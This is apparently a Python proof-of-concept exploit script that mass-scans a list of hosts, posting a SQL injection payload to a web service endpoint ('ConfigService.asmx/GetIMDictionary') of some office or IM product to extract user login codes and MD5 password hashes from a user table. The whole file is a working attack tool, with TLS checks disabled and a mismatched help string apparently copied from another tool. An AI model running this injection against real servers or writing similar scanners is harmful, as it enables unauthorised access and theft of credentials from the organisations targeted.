import requests
from optparse import OptionParser
import urllib3

urllib3.disable_warnings()


def readhttp(filename):
    f = open(filename, "r+", encoding="utf-8")
    lines = f.readlines()
    f.close()
    return lines


def requestspoc(filename, payload):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '77'
    }
    data = "key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --"
    lines = readhttp(filename)
    print("检测结果:")
    for line in lines:
        line = line.replace("\n", "")
        flag = "https" in line
        if flag:
            url = line + "/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary"
        else:
            url = "http://" + line + "/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary"

        try:
            response = requests.post(url, verify=False, headers=headers, data=data, timeout=(1.0, 4.0))
            if str(response) == "<Response [200]>":
                print('[+]' + url + '   ==>   ' + "注入结果:    " + response.text)
            else:
                print('[-]' + url + '   ==>   ' + "不存在漏洞")
        except:
            pass


if __name__ == '__main__':
    parser = OptionParser()
    parser.add_option("-t", "--txt", action="store", dest="text", default='', type="string",
                      help="Mode has generate disable encryption and blasting encryption key [generate/blasting]")
    (options, args) = parser.parse_args()
    requestspoc(filename=options.text, payload=None)
